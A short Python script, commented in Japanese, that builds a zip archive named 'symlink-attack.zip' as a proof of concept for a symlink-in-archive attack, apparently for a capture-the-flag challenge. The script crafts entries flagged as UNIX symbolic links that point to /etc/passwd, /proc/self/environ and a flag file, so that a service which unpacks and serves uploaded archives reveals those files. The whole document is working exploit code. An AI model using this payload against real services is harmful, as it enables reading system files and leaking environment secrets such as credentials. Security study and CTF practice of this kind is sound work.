from zipfile import ZipFile, ZipInfo, ZIP_DEFLATED
import stat

with ZipFile("symlink-attack.zip", "w") as z:
    # 説明ファイル（任意）
    z.writestr("README.txt", "symlink PoC\n")

    # 例1: etc_passwd -> /etc/passwd
    zi = ZipInfo("etc_passwd")
    zi.create_system = 3  # UNIX
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16  # シンボリックリンク属性を付与
    zi.compress_type = ZIP_DEFLATED
    z.writestr(zi, "/etc/passwd")  # 内容に「リンク先パス」を書く

    # 例2: flag -> /RANDOMDIR/flag.txt（CTF環境に合わせて差し替え）
    zi = ZipInfo("flag")
    zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    zi.compress_type = ZIP_DEFLATED
    z.writestr(zi, "/RANDOMDIR/flag.txt")

    # 例3: /proc/self/environ も同様
    zi = ZipInfo("proc_environ")
    zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    zi.compress_type = ZIP_DEFLATED
    z.writestr(zi, "/proc/self/environ")
